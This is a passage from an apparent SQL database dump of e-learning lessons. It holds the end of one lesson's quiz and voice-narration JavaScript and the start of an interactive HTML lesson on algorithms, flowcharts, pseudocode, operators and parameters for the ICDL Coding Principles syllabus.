function answerQ(qid, selected, isCorrect) {\n    if (answers[qid] !== undefined) return; // already answered\n    answers[qid] = selected;\n    \n    const opts = document.getElementById(qid + ''-opts'');\n    const fb = document.getElementById(qid + ''-fb'');\n    \n    // Disable all options\n    opts.querySelectorAll(''.option-btn'').forEach(btn => btn.disabled = true);\n    \n    // Mark selected\n    const selectedBtn = document.getElementById(qid + ''-'' + selected);\n    selectedBtn.classList.add(isCorrect ? ''correct'' : ''wrong'');\n    \n    // If wrong, show correct answer\n    if (!isCorrect) {\n      const correctKey = correct[qid];\n      document.getElementById(qid + ''-'' + correctKey).classList.add(''correct'');\n      fb.className = ''feedback-box wrong'';\n      const wrongMsg = feedbackText[qid]?.wrong || ''✗ Incorrect. Review the relevant section and try to identify why the correct answer applies here.'';\n      fb.innerHTML = `<strong>Incorrect</strong>${wrongMsg}`;\n    } else {\n      fb.className = ''feedback-box correct'';\n      const correctMsg = feedbackText[qid]?.[selected] || ''✓ Correct! Well done.'';\n      fb.innerHTML = `<strong>Correct!</strong>${correctMsg}`;\n      totalCorrect++;\n    }\n    fb.style.display = ''block'';\n    \n    // Track scenario score\n    const scenario = qid.substring(0, 2);\n    if (isCorrect) scenarioScores[scenario]++;\n    scenarioAnswered[scenario]++;\n    \n    // Check if scenario complete\n    if (scenarioAnswered[scenario] === 3) {\n      setTimeout(() => showBranchResult(scenario), 600);\n    }\n    \n    // Check if all answered\n    if (Object.keys(answers).length === 9) {\n      setTimeout(showFinalScore, 1000);\n    }\n  }\n\n  function showBranchResult(scenario) {\n    const score = scenarioScores[scenario];\n    const good = document.getElementById(scenario + ''-branch-good'');\n    const okay = document.getElementById(scenario + ''-branch-okay'');\n    const retry = document.getElementById(scenario + ''-branch-retry'');\n    [good, okay, retry].forEach(el => { el.classList.remove(''show''); el.style.display = ''''; });\n    \n    if (score === 3) {\n      good.style.display = ''block'';\n      good.classList.add(''good'');\n      good.classList.add(''show'');\n    } else if (score === 2) {\n      okay.style.display = ''block'';\n      okay.classList.add(''okay'');\n      okay.classList.add(''show'');\n    } else {\n      retry.style.display = ''block'';\n      retry.classList.add(''retry'');\n      retry.classList.add(''show'');\n    }\n  }\n\n  function showFinalScore() {\n    const scoreEl = document.getElementById(''scoreNum'');\n    const msgEl = document.getElementById(''scoreMsg'');\n    const scoreBox = document.getElementById(''finalScore'');\n    \n    scoreEl.textContent = totalCorrect + ''/9'';\n    if (totalCorrect >= 8) {\n      scoreEl.className = ''score-num high'';\n      msgEl.textContent = ''🏆 Outstanding! You have mastered Module 3 Common AI Examples.'';\n    } else if (totalCorrect >= 6) {\n      scoreEl.className = ''score-num mid'';\n      msgEl.textContent = ''📚 Good work! Review the scenarios where you missed answers and you\\''ll be ready.'';\n    } else {\n      scoreEl.className = ''score-num low'';\n      msgEl.textContent = ''🔄 Keep going! Review the lesson sections and retry the quiz to strengthen your understanding.'';\n    }\n    \n    document.getElementById(''certScore'').textContent = totalCorrect + ''/9'';\n    scoreBox.classList.add(''show'');\n    scoreBox.scrollIntoView({ behavior: ''smooth'', block: ''start'' });\n  }\n\n  function resetQuiz() {\n    // Reset all quiz state\n    Object.keys(answers).forEach(k => delete answers[k]);\n    Object.keys(scenarioScores).forEach(k => scenarioScores[k] = 0);\n    Object.keys(scenarioAnswered).forEach(k => scenarioAnswered[k] = 0);\n    totalCorrect = 0;\n    \n    // Reset UI\n    document.querySelectorAll(''.option-btn'').forEach(btn => {\n      btn.disabled = false;\n      btn.classList.remove(''correct'', ''wrong'');\n    });\n    document.querySelectorAll(''.feedback-box'').forEach(fb => fb.style.display = ''none'');\n    document.querySelectorAll(''.branch-result'').forEach(br => {\n      br.classList.remove(''show'');\n      br.style.display = '''';\n    });\n    document.getElementById(''finalScore'').classList.remove(''show'');\n    window.scrollTo({ top: 0, behavior: ''smooth'' });\n  }\n\n  function restartAll() {\n    resetQuiz();\n    pagesVisited.clear();\n    pagesVisited.add(0);\n    document.querySelectorAll(''.module-pill'').forEach(p => p.classList.remove(''done''));\n    showPage(0);\n  }\n\n  // ── VOICE NARRATION ───────────────────────────────────────────────────────\n  let utterance = null;\n  let speechRate = 1;\n\n  function updateSpeed(val) {\n    speechRate = parseFloat(val);\n    document.getElementById(''speedLabel'').textContent = parseFloat(val).toFixed(1) + ''x'';\n  }\n\n  function startNarration() {\n    if (!window.speechSynthesis) {\n      setVoiceStatus(''Voice not supported in this browser'', false);\n      return;\n    }\n    stopNarration();\n    const page = document.getElementById(''page-'' + currentPage);\n    const text = page?.getAttribute(''data-narration'');\n    if (!text) { setVoiceStatus(''No narration for this page'', false); return; }\n    \n    utterance = new SpeechSynthesisUtterance(text);\n    utterance.rate = speechRate;\n    utterance.pitch = 1;\n    utterance.lang = ''en-GB'';\n    \n    // Try to pick a natural voice\n    const voices = window.speechSynthesis.getVoices();\n    const preferred = voices.find(v => v.name.includes(''Google UK'') || v.name.includes(''Microsoft'') || v.lang === ''en-GB'' || v.lang === ''en-US'');\n    if (preferred) utterance.voice = preferred;\n    \n    utterance.onstart = () => setVoiceStatus(''🔊 Speaking...'', true);\n    utterance.onend = () => setVoiceStatus(''Finished'', false);\n    utterance.onerror = () => setVoiceStatus(''Error — try again'', false);\n    \n    window.speechSynthesis.speak(utterance);\n  }\n\n  function stopNarration() {\n    if (window.speechSynthesis) {\n      window.speechSynthesis.cancel();\n      setVoiceStatus(''Stopped'', false);\n    }\n  }\n\n  function setVoiceStatus(msg, speaking) {\n    const el = document.getElementById(''voiceStatus'');\n    el.textContent = msg;\n    el.className = ''voice-status'' + (speaking ? '' speaking'' : '''');\n  }\n\n  // Load voices on ready\n  if (window.speechSynthesis) {\n    window.speechSynthesis.onvoiceschanged = () => {};\n  }\n\n  // Init\n  updateProgress();\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 0, 'Published', 1, '2026-03-10 03:02:49', '2026-03-10 03:02:49', NULL, NULL);
INSERT INTO `wpcu_mtti_lessons` VALUES
(19, 9, NULL, 'Algorithms Variables Lesson', '', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Algorithms & Code Foundations · ICDL Coding Principles</title>\n<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800;900&family=Fira+Code:wght@300;400;500&family=Nunito:ital,wght@0,300;0,400;0,600;1,300&display=swap" rel="stylesheet">\n<style>\n:root {\n  --ink:#1a1208; --paper:#faf6ef; --amber:#e8870a; --amber2:#f5a623;\n  --teal:#0f7b72; --teal2:#12a99d; --rose:#c0392b;\n  --muted:#7a6a52; --rule:#e2d9c8; --card:#ffffff;\n  --code-bg:#1a1208; --correct:#27ae60; --wrong:#c0392b;\n}\n*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}\nbody{background:var(--paper);color:var(--ink);font-family:''Nunito'',sans-serif;min-height:100vh;overflow-x:hidden}\nbody::before{content:'''';position:fixed;inset:0;z-index:0;pointer-events:none;\n  background-image:repeating-linear-gradient(transparent,transparent 27px,rgba(180,160,120,0.12) 27px,rgba(180,160,120,0.12) 28px)}\nbody::after{content:'''';position:fixed;top:0;bottom:0;left:calc(50% - 480px + 52px);z-index:0;\n  width:2px;background:rgba(232,135,10,0.18);pointer-events:none}\n#app{position:relative;z-index:1;max-width:980px;margin:0 auto;padding:0 20px 100px}\nheader{display:flex;align-items:center;justify-content:space-between;padding:32px 0 24px;border-bottom:2px solid var(--rule);margin-bottom:44px}\n.logo-strip{display:flex;align-items:center;gap:14px}\n.logo-box{width:38px;height:38px;border-radius:8px;background:var(--amber);display:flex;align-items:center;justify-content:center;font-family:''Fira Code'',monospace;font-size:14px;font-weight:500;color:white}\n.logo-text{font-family:''Playfair Display'',serif;font-size:15px;font-weight:700;color:var(--ink);line-height:1.2}\n.logo-text span{display:block;font-family:''Nunito'',sans-serif;font-size:11px;font-weight:400;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase}\n.ch-badge{background:var(--teal);color:white;font-family:''Fira Code'',monospace;font-size:11px;padding:5px 14px;border-radius:20px;letter-spacing:.5px}\n.prog-row{display:flex;gap:6px;align-items:center;margin-bottom:44px}\n.ps{height:5px;flex:1;border-radius:99px;background:var(--rule);transition:background .5s}\n.ps.done{background:var(--amber)} .ps.act{background:linear-gradient(90deg,var(--amber),var(--amber2))}\n.pl{font-family:''Fira Code'',monospace;font-size:10px;color:var(--muted);white-space:nowrap;margin-left:8px}\n.screen{display:none;animation:si .45s cubic-bezier(.4,0,.2,1) both}\n.screen.active{display:block}\n@keyframes si{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}\n.ch-wrap{margin-bottom:36px}\n.ch-ey{font-family:''Fira Code'',monospace;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--amber);margin-bottom:10px}\n.ch-title{font-family:''Playfair Display'',serif;font-size:42px;font-weight:900;line-height:1.1;margin-bottom:14px}\n.ch-title em{font-style:italic;color:var(--teal)}\n.ch-rule{height:3px;width:80px;background:var(--amber);border-radius:2px;margin-bottom:16px}\n.ch-desc{font-size:15px;color:var(--muted);line-height:1.75;max-width:640px}\n.narr-bar{display:flex;align-items:center;gap:14px;background:var(--ink);border-radius:14px;padding:14px 22px;margin-bottom:30px}\n.np{width:40px;height:40px;border-radius:50%;background:var(--amber);border:none;cursor:pointer;flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:transform .2s,background .2s}\n.np:hover{transform:scale(1.1);background:var(--amber2)}\n.np.playing{background:var(--teal2);animation:breathe 2s ease infinite}\n@keyframes breathe{0%,100%{box-shadow:0 0 0 0 rgba(18,169,157,.5)}50%{box-shadow:0 0 0 10px rgba(18,169,157,0)}}\n.np svg{width:16px;height:16px;fill:white;pointer-events:none}\n.ni{flex:1} .ni strong{display:block;font-size:12px;color:white;margin-bottom:2px} .ni span{font-size:11px;color:rgba(255,255,255,.45)}\n.neq{display:flex;align-items:flex-end;gap:3px;height:24px}\n.neq span{display:block;width:3px;background:var(--amber);border-radius:3px;opacity:.4}\n.neq.on span{opacity:1;animation:eq .8s ease infinite}\n.neq span:nth-child(1){height:8px} .neq span:nth-child(2){height:18px;animation-delay:.1s}\n.neq span:nth-child(3){height:12px;animation-delay:.2s} .neq span:nth-child(4){height:22px;animation-delay:.3s}\n.neq span:nth-child(5){height:10px;animation-delay:.4s}\n@keyframes eq{0%,100%{transform:scaleY(.4)}50%{transform:scaleY(1.2)}}\n.card{background:var(--card);border:1px solid var(--rule);border-radius:16px;padding:30px 34px;margin-bottom:22px;box-shadow:0 2px 12px rgba(26,18,8,.06)}\n.cl{display:inline-block;font-family:''Fira Code'',monospace;font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--teal);background:rgba(15,123,114,.08);padding:3px 10px;border-radius:4px;margin-bottom:14px}\n.card h3{font-family:''Playfair Display'',serif;font-size:22px;font-weight:700;margin-bottom:14px;color:var(--ink)}\n.card p{font-size:14.5px;color:#4a3f2f;line-height:1.78} .card p+p{margin-top:10px}\n.scene{border-left:4px solid var(--amber);background:rgba(232,135,10,.05);border-radius:0 14px 14px 0;padding:24px 28px;margin-bottom:22px}\n.scene .st{font-family:''Fira Code'',monospace;font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--amber);margin-bottom:10px;display:block}\n.scene h3{font-family:''Playfair Display'',serif;font-size:19px;font-weight:700;margin-bottom:8px}\n.scene p{font-size:14px;color:#5a4a35;line-height:1.75}\n.g2{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:22px}\n.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:22px}\n@media(max-width:620px){.g2,.g3{grid-template-columns:1fr}}\n.tile{background:var(--card);border:1px solid var(--rule);border-radius:14px;padding:22px 20px;transition:box-shadow .2s,transform .2s}\n.tile:hover{box-shadow:0 6px 20px rgba(26,18,8,.1);transform:translateY(-2px)}\n.tile-i{font-size:26px;margin-bottom:10px}\n.tile h4{font-family:''Playfair Display'',serif;font-size:15px;font-weight:700;color:var(--teal);margin-bottom:7px}\n.tile p{font-size:12.5px;color:var(--muted);line-height:1.65}\n.cb{background:var(--code-bg);border-radius:12px;padding:22px 26px;font-family:''Fira Code'',monospace;font-size:13px;line-height:2;color:rgba(255,255,255,.75);margin:16px 0;overflow-x:auto;border:1px solid rgba(232,135,10,.2)}\n.cb .kw{color:var(--amber2);font-weight:500} .cb .cm{color:#7a6545;font-style:italic}\n.cb .str{color:#a8e6cf} .cb .num{color:#ffb347} .cb .fn{color:var(--teal2)} .cb .op{color:#ff8c94}\n.fc{text-align:center;margin:20px 0;font-family:''Fira Code'',monospace}\n.fc-r{display:flex;justify-content:center;align-items:center;margin:4px 0}\n.fc-b{border:2px solid var(--ink);padding:10px 22px;font-size:12px;background:white;min-width:160px;border-radius:4px;font-weight:500}\n.fc-b.oval{border-radius:50px;background:var(--ink);color:white}\n.fc-b.dia{transform:rotate(45deg);width:80px;height:80px;padding:0;display:flex;align-items:center;justify-content:center;background:rgba(232,135,10,.1);border-color:var(--amber);min-width:unset}\n.fc-b.dia span{transform:rotate(-45deg);font-size:11px;display:block;line-height:1.3}\n.fc-av{text-align:center;font-size:18px;color:var(--muted);margin:0}\n.callout{border:1.5px solid var(--teal);border-radius:12px;padding:18px 24px;background:rgba(15,123,114,.05);margin:16px 0;font-size:14px;color:#2a4a48;line-height:1.75}\n.callout strong{color:var(--teal)}\n.dtt{width:100%;border-collapse:collapse;font-size:13px;margin:14px 0}\n.dtt th{text-align:left;padding:10px 14px;background:var(--ink);color:var(--amber2);font-family:''Fira Code'',monospace;font-size:11px;letter-spacing:1px;text-transform:uppercase}\n.dtt td{padding:10px 14px;border-bottom:1px solid var(--rule);vertical-align:top}\n.dtt tr:nth-child(even) td{background:rgba(232,135,10,.04)}\n.dtt td:first-child{font-family:''Fira Code'',monospace;color:var(--rose);font-size:12.5px}\n.steps{list-style:none;margin:12px 0}\n.steps li{display:flex;gap:14px;align-items:flex-start;padding:12px 0;border-bottom:1px dashed var(--rule);font-size:14px;color:#4a3f2f;line-height:1.65}\n.steps li:last-child{border-bottom:none}\n.sn{flex-shrink:0;width:26px;height:26px;border-radius:6px;background:var(--amber);color:white;display:flex;align-items:center;justify-content:center;font-family:''Fira Code'',monospace;font-size:11px;font-weight:500;margin-top:1px}\n.btn-next{display:inline-flex;align-items:center;gap:10px;background:var(--ink);color:var(--amber2);font-family:''Fira Code'',monospace;font-size:13px;font-weight:500;padding:14px 30px;border-radius:10px;border:none;cursor:pointer;transition:background .2s,transform .2s;margin-top:8px;letter-spacing:.5px}\n.btn-next:hover{background:var(--teal);color:white;transform:translateY(-2px)}\n.qs{margin-bottom:24px}\n.qey{font-family:''Fira Code'',monospace;font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--amber);margin-bottom:10px}\n.qt{font-family:''Playfair Display'',serif;font-size:22px;font-weight:700;line-height:1.35;margin-bottom:14px;color:var(--ink)}\n.qsc{background:rgba(15,123,114,.07);border:1px solid rgba(15,123,114,.2);border-radius:10px;padding:16px 20px;margin-bottom:22px;font-size:13.5px;color:#2a4a3e;line-height:1.7;font-style:italic}\n.opts{display:flex;flex-direction:column;gap:11px}\n.opt{background:var(--card);border:1.5px solid var(--rule);border-radius:12px;padding:16px 20px;display:flex;align-items:flex-start;gap:14px;cursor:pointer;transition:all .2s;font-size:14px;color:#3a2f1e;line-height:1.55;text-align:left}\n.opt:hover{border-color:var(--amber);background:rgba(232,135,10,.05)}\n.opt.sel{border-color:var(--amber);background:rgba(232,135,10,.08)}\n.opt.ok{border-color:var(--correct)!important;background:rgba(39,174,96,.08)!important}\n.opt.bad{border-color:var(--wrong)!important;background:rgba(192,57,43,.07)!important;opacity:.7}\n.ol{flex-shrink:0;width:30px;height:30px;border-radius:8px;border:1.5px solid var(--rule);display:flex;align-items:center;justify-content:center;font-family:''Fira Code'',monospace;font-size:12px;color:var(--muted);transition:all .2s}\n.opt.sel .ol{background:var(--amber);border-color:var(--amber);color:white}\n.opt.ok .ol{background:var(--correct);border-color:var(--correct);color:white}\n.opt.bad .ol{background:var(--wrong);border-color:var(--wrong);color:white}\n.fb{display:none;border-radius:12px;padding:18px 22px;margin-top:18px;font-size:13.5px;line-height:1.75;animation:si .3s ease both}\n.fb.ok{background:rgba(39,174,96,.08);border:1.5px solid rgba(39,174,96,.25)}\n.fb.bad{background:rgba(192,57,43,.07);border:1.5px solid rgba(192,57,43,.2)}\n.fb .fh{font-family:''Playfair Display'',serif;font-weight:700;font-size:16px;margin-bottom:6px}\n.fb.ok .fh{color:var(--correct)} .fb.bad .fh{color:var(--wrong)}\n.fb p{color:#4a3f2f}\n.brs{display:none;flex-direction:column;gap:10px;margin-top:18px}\n.brs.show{display:flex}\n.brbtn{background:white;border:1.5px solid var(--rule);border-radius:12px;padding:14px 20px;display:flex;align-items:center;gap:12px;cursor:pointer;font-size:13.5px;color:var(--ink);text-align:left;transition:all .2s;font-family:''Nunito'',sans-serif}\n.brbtn:hover{border-color:var(--teal);background:rgba(15,123,114,.05);color:var(--teal)}\n.bri{font-size:20px;flex-shrink:0}\n.rr-wrap{text-align:center;padding:44px 0 32px}\n.rr{width:130px;height:130px;border-radius:50%;margin:0 auto 24px;display:flex;align-items:center;justify-content:center;position:relative}\n.rr::before{content:'''';position:absolute;inset:10px;border-radius:50%;background:var(--paper)}\n.ri{position:relative;z-index:1;text-align:center}\n.rb{font-family:''Playfair Display'',serif;font-size:34px;font-weight:900;color:var(--amber);line-height:1}\n.rs2{font-family:''Fira Code'',monospace;font-size:10px;color:var(--muted);letter-spacing:1px}\n.rtit{font-family:''Playfair Display'',serif;font-size:28px;font-weight:900;margin-bottom:10px}\n.rdesc{color:var(--muted);font-size:14px;max-width:460px;margin:0 auto 32px;line-height:1.75}\n.rstats{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:36px}\n.rst{background:var(--card);border:1px solid var(--rule);border-radius:14px;padding:20px 12px;text-align:center;box-shadow:0 2px 8px rgba(26,18,8,.05)}\n.rstv{font-family:''Playfair Display'',serif;font-size:30px;font-weight:900;margin-bottom:4px}\n.rstk{font-family:''Fira Code'',monospace;font-size:10px;color:var(--muted);letter-spacing:1px;text-transform:uppercase}\n.btn-ghost{background:white;border:1.5px solid var(--rule);color:var(--muted);font-family:''Fira Code'',monospace;font-size:12px;padding:12px 24px;border-radius:10px;cursor:pointer;transition:all .2s;margin-left:12px}\n.btn-ghost:hover{border-color:var(--ink);color:var(--ink)}\n.tip{border-bottom:1px dashed var(--amber);color:var(--amber);cursor:help;position:relative}\n.tip:hover::after{content:attr(data-tip);position:absolute;bottom:calc(100% + 8px);left:50%;transform:translateX(-50%);background:var(--ink);color:white;border-radius:8px;padding:8px 14px;font-size:12px;line-height:1.5;white-space:normal;max-width:230px;z-index:100;pointer-events:none;font-family:''Nunito'',sans-serif;font-weight:400}\n</style>\n</head>\n<body>\n<div id="app">\n<header>\n  <div class="logo-strip">\n    <div class="logo-box">&lt;/&gt;</div>\n    <div class="logo-text">ICDL Coding Principles<span>Syllabus 1.0 · Interactive Lesson 2</span></div>\n  </div>\n  <div class="ch-badge">Modules 2.2 · 3.1 · 3.2</div>\n</header>\n<div class="prog-row" id="prog-row"></div>\n\n<!-- SCREEN 0: INTRO -->\n<div class="screen active" id="screen-0">\n  <div class="ch-wrap">\n    <div class="ch-ey">Welcome · Interactive Lesson 2</div>\n    <h1 class="ch-title">Algorithms, Code<br><em>Foundations</em> &amp; Data</h1>\n    <div class="ch-rule"></div>\n    <p class="ch-desc">From designing step-by-step algorithms and reading flowcharts, to writing clean code with variables and the right data types — this lesson covers <strong>Skill Sets 2.2, 3.1 &amp; 3.2</strong> of the ICDL Coding Principles Syllabus.</p>\n  </div>\n  <div class="g3">\n    <div class="tile"><div class="tile-i">🗺️</div><h4>2.2 Algorithms</h4><p>Sequences, flowcharts, pseudocode, and fixing algorithm errors.</p></div>\n    <div class="tile"><div class="tile-i">🛠️</div><h4>3.1 Getting Started</h4><p>Code structure, operators, precedence, parameters, and comments.</p></div>\n    <div class="tile"><div class="tile-i">📦</div><h4>3.2 Variables &amp; Data Types</h4><p>Variables, data types, arrays, lists, tuples, input &amp; output.</p></div>\n  </div>\n  <button class="btn-next" onclick="goTo(1)">Begin Lesson →</button>\n</div>\n\n<!-- SCREEN 1: 2.2 ALGORITHMS -->\n<div class="screen" id="screen-1">\n  <div class="ch-wrap">\n    <div class="ch-ey">Skill Set 2.2</div>\n    <h2 class="ch-title"><em>Algorithms</em></h2>\n    <div class="ch-rule"></div>\n    <p class="ch-desc">An algorithm is a precise, ordered set of steps to solve a problem. Before writing code, developers express algorithms using flowcharts and pseudocode.</p>\n  </div>\n  <div class="narr-bar">\n    <button class="np" id="np-1" onclick="toggleNarr(1)"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></button>\n    <div class="ni"><strong>🔊 Voice Narration — Algorithms</strong><span>Click play to hear this chapter read aloud</span></div>\n    <div class="neq" id="ne-1"><span></span><span></span><span></span><span></span><span></span></div>\n  </div>\n  <div class="scene">\n    <span class="st">📋 Scenario · Meet Kofi</span>\n    <h3>Kofi Builds a Login System</h3>\n    <p>Kofi is a junior developer tasked with building a login system for a student portal. Before writing any code, his mentor says: <em>"Design your algorithm first — flowchart it, then pseudocode it. Code comes last."</em></p>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 2.2.1 — Sequence</span>\n    <h3>The Power of Sequencing</h3>\n    <p>A <span class="tip" data-tip="Sequence: instructions executed one after another in a specific, fixed order.">sequence</span> is the most fundamental programming construct — instructions run one after another in exact order. Changing the order changes the outcome entirely.</p>\n    <div class="callout"><strong>Why it matters:</strong> A recipe that frosts a cake before baking it will fail. A login program that checks the password before reading it will always fail too.</div>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 2.2.2 &amp; 2.2.3 — Flowcharts</span>\n    <h3>Kofi''s Login Flowchart</h3>\n    <p>Flowcharts use standard symbols to represent an algorithm visually. Here is Kofi''s login flow:</p>\n    <div class="fc">\n      <div class="fc-r"><div class="fc-b oval">START</div></div>\n      <div class="fc-av">↓</div>\n      <div class="fc-r"><div class="fc-b">INPUT username &amp; password</div></div>\n      <div class="fc-av">↓</div>\n      <div class="fc-r"><div class="fc-b dia"><span>Valid<br>credentials?</span></div></div>\n      <div class="fc-r" style="gap:60px;margin-top:6px;">\n        <div style="font-family:''Fira Code'',monospace;font-size:11px;color:var(--correct);">YES ↓</div>\n        <div style="font-family:''Fira Code'',monospace;font-size:11px;color:var(--rose);">NO ↓</div>\n      </div>\n      <div class="fc-r" style="gap:30px;margin-top:2px;">\n        <div class="fc-b" style="border-color:var(--correct);font-size:12px;">GRANT access</div>\n        <div class="fc-b" style="border-color:var(--rose);font-size:12px;">SHOW error message</div>\n      </div>\n      <div class="fc-av" style="margin-top:6px;">↓</div>\n      <div class="fc-r"><div class="fc-b oval">END</div></div>\n    </div>\n    <table class="dtt" style="margin-top:20px;">\n      <tr><th>Symbol</th><th>Name</th><th>Meaning</th></tr>\n      <tr><td>Oval / Pill</td><td>Start / Stop</td><td>Beginning or end of the algorithm</td></tr>\n      <tr><td>Rectangle</td><td>Process</td><td>An action or instruction to execute</td></tr>\n      <tr><td>Diamond</td><td>Decision</td><td>A question with Yes / No branches</td></tr>\n      <tr><td>Parallelogram</td><td>Input / Output</td><td>Reading data in or displaying data out</td></tr>\n      <tr><td>Circle</td><td>Connector</td><td>Links parts of a flowchart across pages</td></tr>\n      <tr><td>Arrow</td><td>Flow</td><td>Direction of execution</td></tr>\n    </table>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 2.2.4 &amp; 2.2.5 — Pseudocode</span>\n    <h3>Kofi''s Login in Pseudocode</h3>\n    <p>Pseudocode is structured English — formal enough to express logic, loose enough to skip syntax details. It''s language-agnostic and ideal for planning.</p>\n    <div class="cb">\n<span class="cm">// Login Algorithm — Pseudocode (Ref 2.2.5)</span>\n<span class="kw">BEGIN</span>\n  <span class="kw">INPUT</span> username\n  <span class="kw">INPUT</span> password\n  <span class="kw">IF</span> username <span class="op">==</span> storedUser <span class="kw">AND</span> password <span class="op">==</span> storedPass <span class="kw">THEN</span>\n    <span class="fn">DISPLAY</span> <span class="str">"Access Granted"</span>\n  <span class="kw">ELSE</span>\n    <span class="fn">DISPLAY</span> <span class="str">"Invalid credentials. Try again."</span>\n  <span class="kw">END IF</span>\n<span class="kw">END</span>\n    </div>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 2.2.6 — Fixing Algorithm Errors</span>\n    <h3>Spot the Bugs</h3>\n    <p>Kofi finds a broken version of the algorithm. Three errors are annotated below:</p>\n    <div class="cb">\n<span class="cm">// BUGGY version</span>\n<span class="kw">BEGIN</span>\n  <span class="kw">IF</span> password <span class="op">==</span> storedPass <span class="kw">THEN</span>   <span class="cm">// ❌ Error 1: username not checked</span>\n    <span class="fn">DISPLAY</span> <span class="str">"Access Granted"</span>\n  <span class="kw">END IF</span>                              <span class="cm">// ❌ Error 2: ELSE / error message missing</span>\n<span class="cm">// ❌ Error 3: INPUT steps missing entirely</span>\n<span class="kw">END</span>\n    </div>\n    <div class="callout"><strong>Typical algorithm errors:</strong> missing program elements (like INPUT), incorrect sequence (checking before reading), and incorrect decision outcomes (wrong Yes/No branch).</div>\n  </div>\n  <button class="btn-next" onclick="goTo(2)">Next: Getting Started with Code →</button>\n</div>\n\n<!-- SCREEN 2: 3.1 GETTING STARTED -->\n<div class="screen" id="screen-2">\n  <div class="ch-wrap">\n    <div class="ch-ey">Skill Set 3.1</div>\n    <h2 class="ch-title">Getting <em>Started</em><br>with Code</h2>\n    <div class="ch-rule"></div>\n    <p class="ch-desc">Good code isn''t just functional — it''s readable, structured, and well-documented. Here Kofi writes his first real code.</p>\n  </div>\n  <div class="narr-bar">\n    <button class="np" id="np-2" onclick="toggleNarr(2)"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></button>\n    <div class="ni"><strong>🔊 Voice Narration — Getting Started with Code</strong><span>Click play to hear this chapter read aloud</span></div>\n    <div class="neq" id="ne-2"><span></span><span></span><span></span><span></span><span></span></div>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 3.1.1 — Well-Structured Code</span>\n    <h3>What Makes Code "Good"?</h3>\n    <p>Kofi learns three habits every professional developer follows:</p>\n    <ul class="steps">\n      <li><span class="sn">1</span><div><strong>Indentation</strong> — Each block of code is indented to show structure. Nested code sits deeper, making logic visually obvious at a glance.</div></li>\n      <li><span class="sn">2</span><div><strong>Comments</strong> — Notes inside code that the computer ignores, written purely for human readers. They explain <em>why</em> something is done, not just <em>what</em>.</div></li>\n      <li><span class="sn">3</span><div><strong>Descriptive Naming</strong> — <code>userAge</code> communicates instantly what is stored. <code>x</code> or <code>var1</code> do not.</div></li>\n    </ul>\n    <div class="cb">\n<span class="cm"># Well-structured Python example</span>\n<span class="kw">def</span> <span class="fn">calculate_grade</span>(score, total):\n    <span class="cm">"""Returns letter grade for a given score."""</span>\n    percentage <span class="op">=</span> (score <span class="op">/</span> total) <span class="op">*</span> <span class="num">100</span>   <span class="cm"># indented inside function</span>\n    <span class="kw">if</span> percentage <span class="op">&gt;=</span> <span class="num">70</span>:\n        <span class="kw">return</span> <span class="str">"Pass"</span>\n    <span class="kw">else</span>:\n        <span class="kw">return</span> <span class="str">"Fail"</span>\n    </div>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 3.1.2 &amp; 3.1.3 — Operators &amp; Precedence</span>\n    <h3>Arithmetic Operators &amp; Order of Evaluation</h3>\n    <div class="g2" style="margin-top:14px;">\n      <div class="tile"><div class="tile-i">➕</div><h4>+ Addition</h4><p><code>5 + 3 = 8</code></p></div>\n      <div class="tile"><div class="tile-i">➖</div><h4>− Subtraction</h4><p><code>9 - 4 = 5</code></p></div>\n      <div class="tile"><div class="tile-i">✖️</div><h4>* Multiplication</h4><p><code>3 * 6 = 18</code></p></div>\n      <div class="tile"><div class="tile-i">➗</div><h4>/ Division</h4><p><code>10 / 4 = 2.5</code></p></div>\n    </div>\n    <p>Operator <span class="tip" data-tip="Precedence: the order in which operators evaluate. Multiplication and division before addition and subtraction.">precedence</span> follows BODMAS — multiplication and division before addition and subtraction. Use parentheses to override:</p>\n    <div class="cb">\nresult1 <span class="op">=</span> <span class="num">2</span> <span class="op">+</span> <span class="num">3</span> <span class="op">*</span> <span class="num">4</span>         <span class="cm"># = 14  (3×4 first, then +2)</span>\nresult2 <span class="op">=</span> (<span class="num">2</span> <span class="op">+</span> <span class="num">3</span>) <span class="op">*</span> <span class="num">4</span>       <span class="cm"># = 20  (brackets first)</span>\ngrade   <span class="op">=</span> (score <span class="op">/</span> total) <span class="op">*</span> <span class="num">100</span>  <span class="cm"># parentheses force division first</span>\n    </div>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 3.1.4 — Parameters</span>\n    <h3>What is a Parameter?</h3>\n    <p>A <span class="tip" data-tip="Parameter: a named variable in a function definition that receives a value when the function is called.">parameter</span> is a named input slot in a function definition. When you call the function, you pass in actual values (called <em>arguments</em>) that fill the parameter slots — making functions flexible and reusable.</p>\n    <div class="cb">\n<span class="cm"># ''name'' and ''score'' are parameters</span>\n<span class="kw">def</span> <span class="fn">print_result</span>(name, score):\n    <span class="fn">print</span>(name <span class="op">+</span> <span class="str">" scored: "</span> <span class="op">+</span> str(score))\n\n<span class="fn">print_result</span>(<span class="str">"Kofi"</span>, <span class="num">85</span>)   <span class="cm"># "Kofi scored: 85"</span>\n<span class="fn">print_result</span>(<span class="str">"Amina"</span>, <span class="num">92</span>)  <span class="cm"># "Amina scored: 92" — reused!</span>\n    